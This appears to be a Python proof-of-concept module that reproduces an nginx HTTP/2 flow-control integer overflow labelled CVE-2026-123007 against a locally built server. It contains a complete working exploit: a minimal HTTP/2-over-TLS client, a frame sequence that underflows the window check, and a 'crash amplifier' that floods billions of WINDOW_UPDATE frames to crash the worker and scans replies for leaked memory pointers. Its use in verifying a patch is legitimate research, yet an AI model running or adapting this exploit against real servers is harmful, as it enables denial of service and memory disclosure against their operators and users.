#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-123007: nginx HTTP/2 フロー制御の整数オーバーフロー再現モジュール.

公開 API:
    run(binary: str, workdir: str, host: str = "127.0.0.1",
        quick: bool = False, wu_budget_gb: float = 112.0) -> dict

戻り値:
    {"cve": "CVE-2026-123007", "configured": bool, "trigger": bool,
     "effect": str, "detail": str}
    effect: RCE / LEAK / CRASH / FLOWCTRL / CLOSED / ACCEPT / TRIGGERED / ERROR / SKIP

概要:
  1.31.8 の nginx は WINDOW_UPDATE の検査で「キュー済みだが未送出の DATA」
    (h2c->send_queued) を差し引かない。そのため接続の送信ウィンドウが 0 の間に
    stream 側の WINDOW_UPDATE だけを与えて応答を queued のまま残し、その後に
    WU(0,1792)->WU(0,MAX) を送ると、未送出分を無視した検査を通ってしまう。
    さらに stream ウィンドウを MAX-1 まで上げてから SETTINGS の差分 +2 で
    MAX 超えにすると、nginx 自身が両ストリームを FLOW_CONTROL_ERROR で
    RST_STREAM し、cleanup が queued 分 1792B を接続ウィンドウへ返却する。
    結果、接続ウィンドウは MAX+1792 となり、次の WU(0,MAX) は
    (size_t)(MAX - 2107294727) のアンダーフローで不正に受理される。
    1.31.9 は検査に send_queued を加えるため、同じイベントの WU(0,MAX) が
    GOAWAY(FLOW_CONTROL_ERROR) で拒否され、以降の破綻が起きない。

  quick=True では上記 oracle のみを実行し、数秒〜数十秒で 1.31.8 / 1.31.9 の
  差分 (ACCEPT vs FLOWCTRL) を判定する。quick=False は公式 simple-trigger-full-dbg.py
  の crash amplifier を忠実に移植した経路であり、①512 本の最大長・ヘッダ空 HEAD
  carrier (0xffffff バイト) で制御フレームの flood 会計を満たし、②bytes=0-0 の
  1 バイト Range をウィンドウ 0 で queued の sink にし、③WU(0,MAX) を 2^32 回
  (128 トランシェ x 32 バッチ x 2^20 フレーム = 約 52GiB) 送って接続ウィンドウを
  符号中点 2^63 を越えさせ、各トランシェの切れ目で旧 sink に RST_STREAM を送って
  新しい 1 バイト Range ストリームへ所有者を交代させる (send_timeout 待ちの回避)、
  ④最後の sink に WU(sink,1) を送ると ngx_http_v2_send_chain() の負の limit が
  反転バッファ (last < pos) を作り、その巨大な見かけ長が TLS の memcpy に渡って
  worker が SIGSEGV する (error.log の "worker process N exited on signal 11" で
  判定し effect=CRASH)。応答 DATA に 0x55../0x7d../0x7f.. 系 8 バイトポインタが
  現れた場合は LEAK と判定する。wu_budget_gb が 52GiB 未満の場合は予算分だけ
  送って TRIGGERED を返す。

依存: Python 3.10-3.12 (ssl.MemoryBIO) と libssl.so.3。HPACK は非 Huffman の
リテラル表現のみを使う最小 HTTP/2 クライアントを内蔵する。
"""

import argparse
import ctypes
import json
import os
import re
import select
import signal
import socket
import ssl
import subprocess
import sys
import time

CVE = "CVE-2026-123007"
MAX = 0x7fffffff
PORT = 18443
FRAME_HEADER = 9
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# frame types
DATA = 0
HEADERS = 1
RST_STREAM = 3
SETTINGS = 4
PING = 6
GOAWAY = 7
WINDOW_UPDATE = 8

# flags / error codes
END_STREAM = 1
ACK = 1
END_HEADERS = 4
FLOW_CONTROL_ERROR = 3
CANCEL = 8

# HPACK static table indexes
AUTHORITY = 1
METHOD = 2
PATH = 4
COOKIE = 32
RANGE = 50

FRAME_NAMES = {DATA: "DATA", HEADERS: "HEADERS", RST_STREAM: "RST_STREAM",
               SETTINGS: "SETTINGS", PING: "PING", GOAWAY: "GOAWAY",
               WINDOW_UPDATE: "WINDOW_UPDATE"}

CONF_TMPL = """\
worker_processes 1;
daemon on;
pid __PREFIX__/nginx.pid;
error_log __PREFIX__/logs/error.log info;

events { worker_connections 128; }

http {
    access_log off;
    client_body_temp_path __PREFIX__/tmp/client;
    proxy_temp_path       __PREFIX__/tmp/proxy;
    fastcgi_temp_path     __PREFIX__/tmp/fastcgi;
    uwsgi_temp_path       __PREFIX__/tmp/uwsgi;
    scgi_temp_path        __PREFIX__/tmp/scgi;

    server {
        listen 127.0.0.1:__PORT__ ssl;
        http2 on;
        # crash amplifier は 1 接続で 1000 リクエストを超える HEADERS carrier を
        # 送るため、HTTP/2 の既定 keepalive_requests=1000 による GOAWAY を避ける。
        keepalive_requests 100000;
        # crash amplifier では sink の応答が接続ウィンドウ 0 のまま WU 送出を
        # 待つため、既定 send_timeout 60s による打ち切りを避ける (公式の回転機構
        # でもトランシェ間の待ちが発生しうる)。
        send_timeout 600s;
        ssl_certificate     __PREFIX__/certs/cert.pem;
        ssl_certificate_key __PREFIX__/certs/key.pem;
        ssl_protocols       TLSv1.2 TLSv1.3;
        root __PREFIX__/html;
        location / { }
    }
}
"""


# --------------------------------------------------------------------------
# HTTP/2 + HPACK minimal encoding
# --------------------------------------------------------------------------
def frame(kind, flags, stream, data=b""):
    """9 バイトの HTTP/2 フレームヘッダ + payload。"""
    return len(data).to_bytes(3, "big") + bytes((kind, flags)) + \
        stream.to_bytes(4, "big") + data


def hpack_integer(value, bits, mask=0):
    """RFC 7541 の整数表現 (range ヘッダは継続形式になる)。"""
    maximum = (1 << bits) - 1
    if value < maximum:
        return bytes((mask | value,))
    data = bytearray((mask | maximum,))
    value -= maximum
    while value >= 128:
        data.append((value & 127) | 128)
        value >>= 7
    return bytes(data) + bytes((value,))


def hpack_literal(name_index, value):
    """動的テーブルを汚さない非 Huffman リテラル。"""
    value = value.encode()
    return hpack_integer(name_index, 4) + \
        hpack_integer(len(value), 7) + value


def request_frame(stream, authority, path="/index.html", extra=b""):
    # 0x82 = indexed :method GET, 0x87 = indexed :scheme https
    return frame(HEADERS, END_STREAM | END_HEADERS, stream,
                 b"\x82\x87" + hpack_literal(AUTHORITY, authority) +
                 hpack_literal(PATH, path) + extra)


def setting_frame(value):
    return frame(SETTINGS, 0, 0, b"\0\4" + value.to_bytes(4, "big"))


def update_frame(stream, value):
    return frame(WINDOW_UPDATE, 0, stream, value.to_bytes(4, "big"))


def reset_frame(stream):
    return frame(RST_STREAM, 0, stream, CANCEL.to_bytes(4, "big"))


def ping_frame(payload=b"POC-SYNC"):
    return frame(PING, 0, 0, payload)


# --------------------------------------------------------------------------
# nginx の生成・起動・停止 (pid ファイル + /proc 走査。pkill は使わない)
# --------------------------------------------------------------------------
class NginxServer:
    def __init__(self, binary, prefix, host="127.0.0.1", port=PORT):
        self.binary = os.path.abspath(binary)
        self.prefix = os.path.abspath(prefix)
        self.host = host
        self.port = port
        self.conf = os.path.join(self.prefix, "nginx.conf")
        self.pidfile = os.path.join(self.prefix, "nginx.pid")
        self.errlog = os.path.join(self.prefix, "logs", "error.log")

    def setup(self):
        for sub in ("logs", "html", "certs", "tmp/client", "tmp/proxy",
                    "tmp/fastcgi", "tmp/uwsgi", "tmp/scgi"):
            os.makedirs(os.path.join(self.prefix, sub), exist_ok=True)

        cert = os.path.join(self.prefix, "certs", "cert.pem")
        key = os.path.join(self.prefix, "certs", "key.pem")
        if not (os.path.isfile(cert) and os.path.isfile(key)):
            subprocess.run(
                ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
                 "-days", "30", "-keyout", key, "-out", cert,
                 "-subj", "/CN=localhost",
                 "-addext", "subjectAltName=DNS:localhost,IP:127.0.0.1"],
                check=True, capture_output=True)
            os.chmod(cert, 0o644)
            os.chmod(key, 0o600)

        # oracle の 2*896 + 71*896 + 127 = 65535 の式に合わせて 896 バイト固定。
        page = (b"nginx2root CVE-2026-123007 reproduction page\n")
        page = page + b" " * (896 - len(page)) if len(page) < 896 else page[:896]
        with open(os.path.join(self.prefix, "html", "index.html"), "wb") as f:
            f.write(page)

        # 巨大 memcpy 用の 8MiB 静的ファイル (内容は問わない)。
        big = os.path.join(self.prefix, "html", "big.bin")
        with open(big, "wb") as f:
            f.truncate(8 * 1024 * 1024)

        conf = CONF_TMPL.replace("__PREFIX__", self.prefix).replace(
            "__PORT__", str(self.port))
        with open(self.conf, "w") as f:
            f.write(conf)

    def start(self):
        proc = subprocess.run(
            [self.binary, "-p", self.prefix + "/", "-c", self.conf],
            capture_output=True, text=True)
        if proc.returncode != 0:
            raise RuntimeError("nginx 起動失敗: " + (proc.stderr or proc.stdout).strip())
        deadline = time.time() + 5
        while time.time() < deadline:
            try:
                s = socket.create_connection((self.host, self.port), timeout=0.2)
                s.close()
                return
            except OSError:
                time.sleep(0.05)
        raise RuntimeError("port %d が listen しない" % self.port)

    def stop(self):
        pids = set()
        try:
            with open(self.pidfile) as f:
                pids.add(int(f.read().strip()))
        except (OSError, ValueError):
            pass

        pref = self.prefix.encode()
        for name in os.listdir("/proc"):
            if not name.isdigit():
                continue
            try:
                with open("/proc/%s/cmdline" % name, "rb") as f:
                    cmd = f.read().replace(b"\0", b" ")
            except OSError:
                continue
            if b"nginx" in cmd and pref in cmd:
                pids.add(int(name))

        alive = []
        for pid in pids:
            try:
                os.kill(pid, signal.SIGTERM)
                alive.append(pid)
            except OSError:
                pass

        deadline = time.time() + 5
        while time.time() < deadline:
            if not any(os.path.exists("/proc/%d" % p) for p in alive):
                break
            time.sleep(0.05)

        for pid in alive:
            if os.path.exists("/proc/%d" % pid):
                try:
                    os.kill(pid, signal.SIGKILL)
                except OSError:
                    pass

        try:
            os.unlink(self.pidfile)
        except OSError:
            pass

    def worker_pids(self):
        """master の子 worker を /proc 走査で列挙する。"""
        try:
            with open(self.pidfile) as f:
                master = int(f.read().strip())
        except (OSError, ValueError):
            return []
        out = []
        for name in os.listdir("/proc"):
            if not name.isdigit():
                continue
            try:
                with open("/proc/%s/stat" % name) as f:
                    fields = f.read().split()
            except OSError:
                continue
            if len(fields) > 3 and fields[3] == str(master):
                out.append(int(name))
        return out

    def error_log_text(self):
        try:
            with open(self.errlog, "r", errors="replace") as f:
                return f.read()
        except OSError:
            return ""


# --------------------------------------------------------------------------
# 最小 HTTP/2 over TLS クライアント (MemoryBIO + TLS1.3 KeyUpdate)
# --------------------------------------------------------------------------
class H2Client:
    def __init__(self, host, port, timeout=3.0):
        self.host = host
        self.port = port
        self.raw = socket.socket()
        self.raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG, 1460)
        self.raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
        self.raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, 262144)
        self.raw.settimeout(timeout)
        self.raw.connect((host, port))

        self.incoming = ssl.MemoryBIO()
        self.outgoing = ssl.MemoryBIO()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.minimum_version = ctx.maximum_version = ssl.TLSVersion.TLSv1_3
        ctx.set_alpn_protocols(("h2",))
        self.tls = ctx.wrap_bio(self.incoming, self.outgoing,
                                server_hostname=host)
        self.frames = []          # (kind, flags, stream, payload)
        self._buf = bytearray()
        self.alpn = None

    # -- I/O helpers -------------------------------------------------------
    def flush(self):
        data = self.outgoing.read()
        if data:
            self.raw.sendall(data)

    def encrypt(self, data):
        view = memoryview(data)
        while view:
            view = view[self.tls.write(view):]

    def send(self, data):
        self.encrypt(data)
        self.flush()

    def handshake(self):
        while True:
            try:
                self.tls.do_handshake()
                self.flush()
                break
            except ssl.SSLWantReadError:
                self.flush()
                ct = self.raw.recv(262144)
                if not ct:
                    raise RuntimeError("TLS ハンドシェイク中に切断")
                self.incoming.write(ct)
        self.alpn = self.tls.selected_alpn_protocol()

    def set_recvbuf(self, size):
        self.raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, size)
        self.raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, size)

    def remember(self, data):
        self._buf.extend(data)
        while len(self._buf) >= FRAME_HEADER:
            length = int.from_bytes(self._buf[:3], "big")
            if len(self._buf) < FRAME_HEADER + length:
                return
            kind = self._buf[3]
            flags = self._buf[4]
            stream = int.from_bytes(self._buf[5:9], "big") & MAX
            payload = bytes(self._buf[9:9 + length])
            del self._buf[:FRAME_HEADER + length]
            self.frames.append((kind, flags, stream, payload))

    def drain(self, seconds, predicate=None):
        """受信・復号して frames に記録する。predicate が真なら早期終了。
        戻り値 bool: True=接続生存 (timeout/predicate), False=FIN/close_notify。
        ソケットタイムアウトは呼び出し前の値に復元する (増幅中の長い
        sendall が 0.25 秒タイムアウトで切れるのを防ぐ)。"""
        old_timeout = self.raw.gettimeout()
        deadline = time.monotonic() + seconds
        self.raw.settimeout(0.25)
        try:
            while time.monotonic() < deadline:
                try:
                    data = self.raw.recv(262144)
                    if not data:
                        return False
                    self.incoming.write(data)
                    while True:
                        try:
                            clear = self.tls.read(262144)
                            if not clear:
                                return False
                            self.remember(clear)
                        except ssl.SSLWantReadError:
                            break
                        except ssl.SSLWantWriteError:
                            break
                    self.flush()
                except socket.timeout:
                    pass
                if predicate is not None and predicate(self.frames):
                    return True
            return True
        finally:
            self.raw.settimeout(old_timeout)

    def send_flight(self, flight):
        """1 つの TLS flight を、受信も処理しながら送る (デッドロック回避)。"""
        self.raw.settimeout(600)
        view = memoryview(flight)
        self.raw.setblocking(False)
        while view:
            r, w, _ = select.select([self.raw], [self.raw], [], 1.0)
            if r:
                data = self.raw.recv(262144)
                if not data:
                    raise RuntimeError("flight 送信中に接続が閉じた")
                self.incoming.write(data)
                while True:
                    try:
                        clear = self.tls.read(262144)
                        if not clear:
                            break
                        self.remember(clear)
                    except ssl.SSLWantReadError:
                        break
                    except ssl.SSLWantWriteError:
                        break
            if w:
                try:
                    n = self.raw.send(view[:262144])
                    view = view[n:]
                except BlockingIOError:
                    pass
        self.raw.setblocking(True)

    def append_key_updates(self, flight, count=262144):
        """TLS1.3 KeyUpdate を flight に積む。CPython の SSL* を ctypes で取得。"""
        if not hasattr(self.tls, "_sslobj"):
            raise RuntimeError("CPython の SSL オブジェクトが見つからない")
        libssl = ctypes.CDLL("libssl.so.3")
        libssl.SSL_key_update.argtypes = (ctypes.c_void_p, ctypes.c_int)
        libssl.SSL_key_update.restype = ctypes.c_int
        libssl.SSL_do_handshake.argtypes = (ctypes.c_void_p,)
        libssl.SSL_do_handshake.restype = ctypes.c_int
        try:
            ptr = ctypes.c_void_p(
                ctypes.c_void_p.from_address(id(self.tls._sslobj) + 24).value)
        except (ValueError, TypeError) as exc:
            raise RuntimeError("SSL* の取得に失敗: %s" % exc)
        if not ptr.value:
            raise RuntimeError("SSL* が NULL")
        for _ in range(count):
            if (libssl.SSL_key_update(ptr, 1) != 1
                    or libssl.SSL_do_handshake(ptr) != 1):
                raise RuntimeError("SSL_key_update / SSL_do_handshake 失敗")
            flight.extend(self.outgoing.read())

    def close(self):
        try:
            self.raw.close()
        except OSError:
            pass


# --------------------------------------------------------------------------
# quick oracle (cleanup over-credit + underflowed guard)
# --------------------------------------------------------------------------
def run_oracle(client, authority):
    """公式 oracle 手順を実行し、判定材料を dict で返す。"""
    out = {
        "handshake": False,
        "passed": False,
        "sync": False,
        "live": True,
        "frames": 0,
        "reset_errors": {},
        "release_len": 0,
        "public_len": 0,
        "goaways": [],
    }
    client.send(PREFACE + frame(
        SETTINGS, 0, 0, b"\0\1\0\0\0\0\0\4\0\0\xff\xff"))
    client.drain(1)
    client.send(frame(SETTINGS, ACK, 0))

    # 896B の公開ページを 2 本、続けて 71 本 + 127B Range。
    # 2*896 + 71*896 + 127 = 65535 で接続ウィンドウをちょうど 0 にする。
    client.send(request_frame(1, authority) + request_frame(3, authority))
    client.drain(1)
    client.send(
        b"".join(request_frame(s, authority) for s in range(5, 147, 2)) +
        request_frame(147, authority, extra=hpack_literal(RANGE, "bytes=0-126")))
    client.drain(2)

    # ここから受信側を絞り、キュー済み DATA が流れきらないようにする。
    client.set_recvbuf(1024)
    client.send(setting_frame(0))
    time.sleep(0.05)
    # 新規ストリーム 149/151 は初期ウィンドウ 0。stream 側だけ 896B 与える。
    client.send(request_frame(149, authority) + request_frame(151, authority))
    time.sleep(0.05)
    client.send(update_frame(149, 896) + update_frame(151, 896))
    time.sleep(0.05)

    # ルート原因イベント + その後続フレーム (すべて同じ TCP 書き込みに載せる)。
    event = (update_frame(0, 1792) + update_frame(0, MAX) +
             update_frame(149, MAX - 1) + update_frame(151, MAX - 1) +
             setting_frame(2) + update_frame(0, MAX) + setting_frame(65535) +
             request_frame(155, authority,
                           extra=hpack_literal(RANGE, "bytes=0-9")))

    head = (hpack_literal(METHOD, "HEAD") + b"\x87" +
            hpack_literal(AUTHORITY, authority) +
            hpack_literal(PATH, "/index.html"))
    carrier = frame(HEADERS, END_STREAM | END_HEADERS, 153,
                    b"\x20" * (7340032 - len(event) - 9 - len(head)) + head)
    client.encrypt(carrier + event)
    flight = bytearray(client.outgoing.read())

    # TLS1.3 KeyUpdate で parser/output の境界を作る (公式 oracle と同じ)。
    client.append_key_updates(flight, 262144)
    client.send_flight(flight)
    time.sleep(5)

    client.set_recvbuf(262144)

    def oracle_evidence(frames):
        rst = {s for k, _f, s, _p in frames
               if k == RST_STREAM and s in (149, 151)}
        rel = any(k == DATA and s == 155 for k, _f, s, _p in frames)
        return len(rst) == 2 and rel

    out["live"] = client.drain(15, oracle_evidence)

    reset_errors = {
        s: int.from_bytes(p, "big")
        for k, _f, s, p in client.frames
        if k == RST_STREAM and s in (149, 151) and len(p) == 4
    }
    public_body = b"".join(p for k, _f, s, p in client.frames
                           if k == DATA and s == 1)
    release_frames = [(f, p) for k, f, s, p in client.frames
                      if k == DATA and s == 155]
    release_body = b"".join(p for _f, p in release_frames)
    goaways = [(int.from_bytes(p[:4], "big"), int.from_bytes(p[4:8], "big"))
               for k, _f, _s, p in client.frames
               if k == GOAWAY and len(p) >= 8]

    out["reset_errors"] = reset_errors
    out["release_len"] = len(release_body)
    out["public_len"] = len(public_body)
    out["goaways"] = goaways
    out["passed"] = (
        reset_errors == {149: FLOW_CONTROL_ERROR, 151: FLOW_CONTROL_ERROR}
        and bool(release_frames)
        and bool(release_frames[-1][0] & END_STREAM)
        and len(public_body) == 896
        and release_body == public_body[:10]
    )

    # 破綻した接続が生きていることの証明。PING ACK を要求する。
    before = len(client.frames)
    client.send(ping_frame(b"POC-SYNC"))

    def sync_evidence(frames):
        return any(k == PING and (f & ACK) and s == 0 and p == b"POC-SYNC"
                   for k, f, s, p in frames[before:])

    live2 = client.drain(3, sync_evidence)
    out["live"] = out["live"] and live2
    out["sync"] = sync_evidence(client.frames)
    out["frames"] = len(client.frames)
    return out


def _find_flowctrl_line(logtext):
    for line in logtext.splitlines():
        if "not allowed for window" in line:
            return line.strip()
    return ""


def _find_worker_signal_line(logtext):
    """error.log から worker の SIGSEGV 行 (exited on signal 11 等) を拾う。"""
    for line in logtext.splitlines():
        if "worker process" in line and "exited on signal" in line:
            return line.strip()
    return ""


# --------------------------------------------------------------------------
# 公式 crash amplifier の移植 (signed-window / 巨大 memcpy 経路, quick=False)
# --------------------------------------------------------------------------
def run_amplifier(client, authority, wu_budget_gb):
    """公式 simple-trigger-full-dbg.py の crash amplifier を忠実に移植する。

    ①512 本の最大長・ヘッダ空 HEAD carrier (0xffffff バイト) で flood 会計を満たし、
    ②bytes=0-0 の 1 バイト Range sink をウィンドウ 0 で queued にし、
    ③WU(0,MAX) を 2^32 回 (128 トランシェ x 32 バッチ x 2^20 フレーム = 52GiB)
    送り、各トランシェの切れ目で旧 sink に RST_STREAM(CANCEL) を送って新しい
    sink へ所有者を交代させる、④最後の sink に WU(sink,1) を送る。
    """
    detail = []
    stats = {}

    head = (hpack_literal(METHOD, "HEAD") + b"\x87" +
            hpack_literal(AUTHORITY, authority) +
            hpack_literal(PATH, "/index.html"))

    # ① flood 検査 (total_bytes/8 > payload_bytes + 1MB) の会計用 carrier。
    # HEAD は応答本文を持たないので、これ以降の接続ウィンドウを消費しない。
    n_carriers = 512
    carrier = bytearray(frame(HEADERS, END_STREAM | END_HEADERS, 157,
                              b"\x20" * (0xffffff - len(head)) + head))
    stream_id = 157
    carrier_bytes = 0
    for i in range(n_carriers):
        carrier[5:9] = stream_id.to_bytes(4, "big")
        stream_id += 2
        client.send(carrier)
        carrier_bytes += len(carrier)
        if i % 64 == 63:
            client.drain(0.02)
    detail.append("flood 用 HEAD carrier %d 本 (%d バイト, stream 157-%d)"
                  % (n_carriers, carrier_bytes, stream_id - 2))
    stats["carrier_count"] = n_carriers
    stats["carrier_bytes"] = carrier_bytes

    # ② 1 バイト Range (bytes=0-0) の sink を 1 本だけウィンドウ 0 で queued に。
    sink = stream_id
    one_byte_range = hpack_literal(RANGE, "bytes=0-0")
    client.send(setting_frame(0) +
                request_frame(sink, authority, extra=one_byte_range))
    client.drain(1)
    if (not any(k == HEADERS and s == sink for k, _f, s, _p in client.frames)
            or any(k == DATA and s == sink for k, _f, s, _p in client.frames)):
        raise RuntimeError("1 バイト Range の owner が queued になっていない")
    detail.append("sink stream %d (bytes=0-0) をウィンドウ 0 で queued にした"
                  % sink)

    # ③ WU(0,MAX) を 2^32 回。2^32 * (2^31-1) + 初期 MAX+1792 で接続
    #    ウィンドウ (ssize_t) が 2^63 + 1790 を超えて負値になる。
    signed_frames = 1 << 32
    batch_frames = 1 << 20      # 1 バッチ = 1,048,576 フレーム = 13MiB
    tranche_batches = 32        # 1 トランシェ = 32 バッチ = 416MiB
    budget_frames = int(wu_budget_gb * (1024 ** 3)) // 13
    frames = min(signed_frames, budget_frames)
    stats.update({"signed_frames": signed_frames, "frames": frames,
                  "wire_bytes": frames * 13})

    client.raw.settimeout(600)
    batch = update_frame(0, MAX) * batch_frames
    t0 = time.monotonic()

    if frames < signed_frames:
        left = frames
        while left > 0:
            n = min(left, batch_frames)
            client.send(batch if n == batch_frames else batch[:13 * n])
            left -= n
        stats["wu_elapsed_sec"] = time.monotonic() - t0
        detail.append("WU(0,MAX) を %.2f GiB (%d フレーム) 送信 "
                      "(符号中点 2^63 まで %d フレーム)"
                      % (frames * 13 / (1024 ** 3), frames, signed_frames))
        detail.append("wu_budget_gb 不足のため符号中点 2^63 未達 (TRIGGERED)")
        return "TRIGGERED", detail, stats

    # 完全系: 128 トランシェ。各トランシェの切れ目で旧 sink を RST_STREAM して
    # 新しい 1 バイト Range ストリームへ所有者を交代させる (公式の回転機構。
    # send_timeout 待ちを回避し、負の接続ウィンドウ中に DATA を出させない)。
    n_tranches = signed_frames // (batch_frames * tranche_batches)
    rotations = 0
    for tranche in range(n_tranches):
        for _ in range(tranche_batches):
            client.send(batch)
        if tranche != n_tranches - 1:
            next_sink = sink + 2
            client.send(reset_frame(sink) +
                        request_frame(next_sink, authority,
                                      extra=one_byte_range))
            sink = next_sink
            rotations += 1
            if tranche % 16 == 15:
                client.drain(0.02)
    stats["wu_elapsed_sec"] = time.monotonic() - t0
    stats["rotations"] = rotations
    detail.append("WU(0,MAX) を 2^32 回 (%.2f GiB, %.1f 秒) 送り、"
                  "接続ウィンドウを符号中点 2^63 を越えさせた"
                  % (frames * 13 / (1024 ** 3), stats["wu_elapsed_sec"]))
    detail.append("sink 所有者を %d 回交代 (最終 sink stream %d)"
                  % (rotations, sink))

    # ④ 最後の sink に 1 バイト与える。負の limit から反転バッファ
    #    (last < pos) が作られ、巨大な見かけ長が TLS の memcpy に渡る。
    client.send(update_frame(sink, 1))
    detail.append("最終 sink %d に WU(sink,1) を送信 "
                  "(limit = (ssize_t)(2^63+1790) = 負値)" % sink)
    live = client.drain(20)
    stats["live_after"] = live
    sink_data = b"".join(p for k, _f, s, p in client.frames
                         if k == DATA and s == sink)
    stats["sink_data_len"] = len(sink_data)

    pointers = []
    for off in range(0, max(0, len(sink_data) - 7)):
        val = int.from_bytes(sink_data[off:off + 8], "little")
        if (0x550000000000 <= val < 0x570000000000
                or 0x7d0000000000 <= val < 0x800000000000):
            pointers.append((off, val))
    stats["pointers"] = pointers[:8]

    if pointers:
        detail.append("応答 DATA %d バイト中に 0x55../0x7d../0x7f.. 系 8B ポインタ "
                      "%d 個 (例: off=%d val=0x%x)"
                      % (len(sink_data), len(pointers),
                         pointers[0][0], pointers[0][1]))
        return "LEAK", detail, stats

    if not live:
        detail.append("WU(sink,1) 後に接続が閉じた (worker SIGSEGV の兆候)")
        return "CLOSED", detail, stats

    detail.append("巨大コピー経路を通過したが worker は生存 (TRIGGERED)")
    return "TRIGGERED", detail, stats


def _ping_alive(client):
    before = len(client.frames)
    try:
        client.send(ping_frame(b"POC-LIVE"))
    except OSError:
        return False
    live = client.drain(3, lambda fr: any(
        k == PING and (f & ACK) and p == b"POC-LIVE"
        for k, f, _s, p in fr[before:]))
    return live and any(
        k == PING and (f & ACK) and p == b"POC-LIVE"
        for k, f, _s, p in client.frames[before:])


# --------------------------------------------------------------------------
# public API
# --------------------------------------------------------------------------
def run(binary, workdir, host="127.0.0.1", quick=False, wu_budget_gb=112.0):
    result = {"cve": CVE, "configured": False, "trigger": False,
              "effect": "ERROR", "detail": ""}
    srv = NginxServer(binary, workdir, host, PORT)
    client = None
    try:
        srv.setup()
        srv.start()
        result["configured"] = True
        authority = host if PORT == 443 else "%s:%d" % (host, PORT)

        client = H2Client(host, PORT)
        client.handshake()
        if client.alpn != "h2":
            raise RuntimeError("ALPN が h2 にならない: %r" % (client.alpn,))

        o = run_oracle(client, authority)
        err = srv.error_log_text()
        flowctrl_line = _find_flowctrl_line(err)

        if o["passed"]:
            result["trigger"] = True
            parts = [
                "oracle 成立: RST_STREAM(149,151)=FLOW_CONTROL_ERROR(3)、"
                "stream 155 に %d バイト DATA(END_STREAM)、PING ACK=%s、"
                "受信フレーム数=%d (公開応答 %d バイト)"
                % (o["release_len"], o["sync"], o["frames"], o["public_len"]),
            ]
            if quick:
                result["effect"] = "ACCEPT"
                parts.append("接続ウィンドウ MAX+1792 への返却後、"
                             "アンダーフローした検査が WU(0,MAX) を受理した")
            else:
                effect, amp_detail, stats = run_amplifier(
                    client, authority, wu_budget_gb)
                # worker の SIGSEGV は error.log の "worker process N
                # exited on signal 11" で最終確認する。
                sigline = _find_worker_signal_line(srv.error_log_text())
                if sigline and effect != "LEAK":
                    effect = "CRASH"
                    amp_detail.append("error.log: " + sigline)
                elif effect == "CLOSED" and not sigline:
                    amp_detail.append("error.log に worker の signal 行が"
                                      "見つからない (worker SIGSEGV 未確認)")
                result["effect"] = effect
                parts.extend(amp_detail)
            result["detail"] = " / ".join(parts)
        else:
            # 修正版 (1.31.9) は WU(0,MAX) を send_queued 込みで検査して拒否する。
            if flowctrl_line:
                result["effect"] = "FLOWCTRL"
                parts = [
                    "oracle 不成立: RST_STREAM(149/151) が返らず、"
                    "接続ウィンドウの返却が起きない",
                    "error.log: " + flowctrl_line,
                    "受信フレーム数=%d / GOAWAY=%r" % (o["frames"], o["goaways"]),
                ]
            elif not o["live"]:
                result["effect"] = "CLOSED"
                parts = ["oracle 途中で接続が閉じた",
                         "RST_STREAM=%r / 受信フレーム数=%d"
                         % (o["reset_errors"], o["frames"])]
            else:
                result["effect"] = "ERROR"
                parts = ["oracle の証拠が揃わない",
                         "RST_STREAM=%r / 155 DATA=%d バイト / PING ACK=%s / "
                         "受信フレーム数=%d"
                         % (o["reset_errors"], o["release_len"], o["sync"],
                            o["frames"])]
                if flowctrl_line:
                    parts.append("error.log: " + flowctrl_line)
            result["detail"] = " / ".join(parts)
        return result
    except Exception as exc:  # noqa: BLE001
        # 増幅中に送信が例外で切れても、worker が SIGSEGV していれば CRASH。
        try:
            sigline = _find_worker_signal_line(srv.error_log_text())
        except Exception:  # noqa: BLE001
            sigline = ""
        if sigline:
            result["effect"] = "CRASH"
            result["detail"] = ("%s: %s / error.log: %s"
                                % (type(exc).__name__, exc, sigline))
        else:
            result["effect"] = "ERROR"
            result["detail"] = "%s: %s" % (type(exc).__name__, exc)
        return result
    finally:
        if client is not None:
            client.close()
        try:
            srv.stop()
        except Exception:  # noqa: BLE001
            pass


def _cli():
    ap = argparse.ArgumentParser(description="CVE-2026-123007 PoC module")
    ap.add_argument("--binary",
                    default="/app/data/sessions/conv-43/build/inst-vuln/sbin/nginx")
    ap.add_argument("--workdir",
                    default="/app/data/sessions/conv-43/poc-run-A")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--quick", action="store_true")
    ap.add_argument("--wu-budget-gb", type=float, default=112.0)
    args = ap.parse_args()
    out = run(args.binary, args.workdir, args.host,
              quick=args.quick, wu_budget_gb=args.wu_budget_gb)
    print(json.dumps(out, ensure_ascii=False))


if __name__ == "__main__":
    _cli()
